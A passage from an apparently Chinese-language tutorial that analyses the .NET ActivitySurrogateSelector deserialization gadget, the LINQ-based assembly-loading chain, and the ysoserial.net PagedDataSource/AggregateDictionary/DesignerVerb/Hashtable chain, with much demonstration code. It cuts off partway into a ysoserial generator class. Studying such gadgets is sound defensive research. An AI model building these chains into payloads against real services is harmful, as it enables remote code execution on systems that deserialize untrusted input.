class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708913307609-24914cbb-ed52-4f1f-be3c-4642c4e8e2b0.png#averageHue=%239bb4ad&clientId=udc8a13d2-fd1b-4&from=paste&height=304&id=ufc274eec&originHeight=380&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78637&status=done&style=none&taskId=ue131bf34-6c3e-430c-baf9-a1130b2b781&title=&width=1536" alt="image.png"><br>但是今天说到的ActivitySurrogateSelector就不一样了，他可以序列化，也可以反序列化。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">NonSerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> _text;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">NonSerializable</span>(<span class="params"><span class="built_in">string</span> text</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _text = text;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> _text;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Custom serialization surrogate</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> NonSerializable(<span class="string">&quot;Hello World!&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708913879879-fbaae556-88c9-426f-8052-d7b67656ea9d.png#averageHue=%234f4332&clientId=udc8a13d2-fd1b-4&from=paste&height=820&id=u60d4d7c4&originHeight=1025&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235915&status=done&style=none&taskId=ubccdb42d-f1d2-49c5-8a78-af8e6324235&title=&width=1534.4" alt="image.png"><br>成功的反序列化了，这是为什么呢？我们可以去分析一下，可以看到payload中有<code>System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate</code>这一段，其中ObjectSurrogate是关键。<br>这是它的一个内部类</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">ObjectSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> (obj)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> ActivityBind _:</span><br><span class="line">            <span class="keyword">case</span> DependencyObject _:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="literal">default</span>:</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="keyword">nameof</span> (obj));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        info.AddValue(<span class="string">&quot;type&quot;</span>, (<span class="built_in">object</span>) obj.GetType());</span><br><span class="line">        <span class="built_in">string</span>[] names = (<span class="built_in">string</span>[]) <span class="literal">null</span>;</span><br><span class="line">        MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(obj.GetType(), <span class="keyword">out</span> names);</span><br><span class="line">        <span class="built_in">object</span>[] objectData = FormatterServices.GetObjectData(obj, serializableMembers);</span><br><span class="line">        info.AddValue(<span class="string">&quot;memberDatas&quot;</span>, (<span class="built_in">object</span>) objectData);</span><br><span class="line">        info.SetType(<span class="keyword">typeof</span> (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="built_in">object</span> obj,</span></span></span><br><span class="line"><span class="params"><span class="function">        SerializationInfo info,</span></span></span><br><span class="line"><span class="params"><span class="function">        StreamingContext context,</span></span></span><br><span class="line"><span class="params"><span class="function">        ISurrogateSelector selector</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">object</span>) <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>它做了一段处理<code>info.SetType(typeof (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</code>它将我们序列化的类的属性设置为了ObjectSerializedRef，我们再看看这个类。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Serializable</span>]</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">ObjectSerializedRef</span> : <span class="title">IObjectReference</span>, <span class="title">IDeserializationCallback</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">private</span> Type type;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">object</span>[] memberDatas;</span><br><span class="line">        [<span class="meta">NonSerialized</span>]</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">object</span> returnedObject;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">object</span> IObjectReference.GetRealObject(StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &amp;&amp; !<span class="keyword">typeof</span> (ActivityBind).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !<span class="keyword">typeof</span> (DependencyObject).IsAssignableFrom(<span class="keyword">this</span>.type))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="keyword">nameof</span> (context));</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">this</span>.returnedObject = FormatterServices.GetUninitializedObject(<span class="keyword">this</span>.type);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">this</span>.returnedObject;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">void</span> IDeserializationCallback.OnDeserialization(<span class="built_in">object</span> sender)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &amp;&amp; !<span class="keyword">typeof</span> (ActivityBind).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !<span class="keyword">typeof</span> (DependencyObject).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !(<span class="keyword">this</span>.returnedObject <span class="keyword">is</span> ActivityBind) &amp;&amp; !(<span class="keyword">this</span>.returnedObject <span class="keyword">is</span> DependencyObject))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">          <span class="built_in">string</span>[] names = (<span class="built_in">string</span>[]) <span class="literal">null</span>;</span><br><span class="line">          FormatterServices.PopulateObjectMembers(<span class="keyword">this</span>.returnedObject, FormatterServicesNoSerializableCheck.GetSerializableMembers(<span class="keyword">this</span>.type, <span class="keyword">out</span> names), <span class="keyword">this</span>.memberDatas);</span><br><span class="line">          <span class="keyword">this</span>.returnedObject = (<span class="built_in">object</span>) <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>它是一个可序列化的类，也就是说我们可以序列化并且反序列化一个本不可反序列化的类。所以说为啥和Hessian很像，那么既然如此，攻击面就可以扩大化了。</p><h2 id="0-3-1-LINQ"><a href="#0-3-1-LINQ" class="headerlink" title="0-3.1 LINQ"></a>0-3.1 LINQ</h2><p>什么是LINQ呢，LINQ是C#中一种类sql的查询语法。就简单的举个例子</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> word = <span class="string">&quot;hello from linq.&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> words = word.Split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> q1 = <span class="keyword">from</span> s <span class="keyword">in</span> words</span><br><span class="line">        <span class="keyword">where</span> s.ToLower().Contains(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">        <span class="keyword">select</span> s;</span><br><span class="line">    Console.WriteLine(q1);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> q1)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(item);</span><br><span class="line">    &#125;</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.Linq.Enumerable+WhereArrayIterator`1[System.String]</span><br><span class="line">hello</span><br><span class="line">from</span><br></pre></td></tr></table></figure><p>他会返回一个Enumerable迭代对象当做查询结果。并且LINQ有一个特性叫做延迟执行，也就是说当语句执行到<br><code> var q1 = from s in words where s.ToLower().Contains(&#39;o&#39;) select s;</code><br>这一步的时候，它并不会执行select语句，它需要被当做enumerable对象的时候会自动触发，也就是上述demo中的<code>foreach (var item in q1)</code><br>结合上面说的攻击面扩大，我们可以反序列化LINQ对象进行命令执行，基本的触发链如下</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">        data.Add(File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">        Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">        <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> o <span class="keyword">in</span> e3)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他其实和Chaintransformer是一样的，一个链式调用，最终执行到CreateInstance里面实例化任意类，至于那个委托是因为方法需要反射获取。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708943897905-58cb67af-68fd-4982-99b0-d2185f309a63.png#averageHue=%232c2b2a&clientId=ud5d48222-4356-4&from=paste&height=581&id=u8cabb54d&originHeight=726&originWidth=1715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=192138&status=done&style=none&taskId=ub2b558bc-7e03-44bf-be80-c2b4e0b7d11&title=&width=1372" alt="image.png"></p><h2 id="0-3-2-调用链"><a href="#0-3-2-调用链" class="headerlink" title="0-3.2 调用链"></a>0-3.2 调用链</h2><p>ysoserial.net找到的调用链如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEnumerable -&gt; PagedDataSource -&gt; ICollection</span><br><span class="line">ICollection -&gt; AggregateDictionary -&gt; IDictionary</span><br><span class="line">IDictionary -&gt; DesignerVerb -&gt; ToString</span><br></pre></td></tr></table></figure><p>最终是要到IEnumberable触发。我们一点点往上看<br>PagedDataSource<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944071261-6ee026e4-9d2f-45e9-8ff1-d1981b2df242.png#averageHue=%23212020&clientId=ud5d48222-4356-4&from=paste&height=499&id=uc6f2e87e&originHeight=624&originWidth=1504&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80286&status=done&style=none&taskId=u9f7bf920-7455-4ef2-9fbc-2ab618330b5&title=&width=1203.2" alt="image.png"><br>其中属性dataSource是IEnumerable类型，因此可以承接上终点的LINQ，又因为PagedDataSource是ICollection的子类，因此可以往上强转，最终到了<code>AggregateDictionary</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944338214-3c96a652-f89d-4477-b1d6-b253bd6e9a2d.png#averageHue=%23232120&clientId=ud5d48222-4356-4&from=paste&height=536&id=u1e048ada&originHeight=670&originWidth=1394&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120289&status=done&style=none&taskId=u55b3b8d7-ba5d-4bc8-85ae-cda1a9c576f&title=&width=1115.2" alt="image.png"><br>这里触发了Enumberable，并且可以看到它的构造方法传入了Icollection对象，我们把上面说到的PagedDataSource放进去就好了。<br><code>AggregateDictionary</code>继承IDictionary，因此继续往上看。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DesignerVerb</span> : <span class="title">MenuCommand</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DesignerVerb</span>(<span class="params"><span class="built_in">string</span> text, EventHandler handler</span>)</span></span><br><span class="line"><span class="function">      : <span class="title">base</span>(<span class="params">handler, StandardCommands.VerbFirst</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] = text == <span class="literal">null</span> ? (<span class="built_in">object</span>) (<span class="built_in">string</span>) <span class="literal">null</span> : (<span class="built_in">object</span>) Regex.Replace(text, <span class="string">&quot;\\(\\&amp;.\\)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DesignerVerb</span>(<span class="params"><span class="built_in">string</span> text, EventHandler handler, CommandID startCommandID</span>)</span></span><br><span class="line"><span class="function">      : <span class="title">base</span>(<span class="params">handler, startCommandID</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] = text == <span class="literal">null</span> ? (<span class="built_in">object</span>) (<span class="built_in">string</span>) <span class="literal">null</span> : (<span class="built_in">object</span>) Regex.Replace(text, <span class="string">&quot;\\(\\&amp;.\\)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Description</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">get</span> =&gt; (<span class="built_in">string</span>) <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Description)] ?? <span class="built_in">string</span>.Empty;</span><br><span class="line">      <span class="keyword">set</span> =&gt; <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Description)] = (<span class="built_in">object</span>) <span class="keyword">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Text =&gt; (<span class="built_in">string</span>) <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] ?? <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span> =&gt; <span class="keyword">this</span>.Text + <span class="string">&quot; : &quot;</span> + <span class="keyword">base</span>.ToString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把一些重点方法拿出来了。可以看到ToString的地方配合上Text字段的getter方法可以接上<code>AggregateDictionary</code>，我们只需要将properties设置为<code>AggregateDictionary</code>即可。因此最终来到了如何触发ToString方法上，这里Ysoserial中使用的是HashTable。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944687221-85dc675f-768d-4db5-af0c-57f5f2775f42.png#averageHue=%2321201f&clientId=ud5d48222-4356-4&from=paste&height=304&id=u96d91796&originHeight=380&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88267&status=done&style=none&taskId=ucc1d493c-a941-42b1-8599-67c1883e0c8&title=&width=1186.4" alt="image.png"><br>Hashtable在反序列化的时候会重新建key集合。引发异常的话就会触发ToString，如图，如果2个键相同就会引发异常。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel.Design;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI.WebControls;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> NDesk.Options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        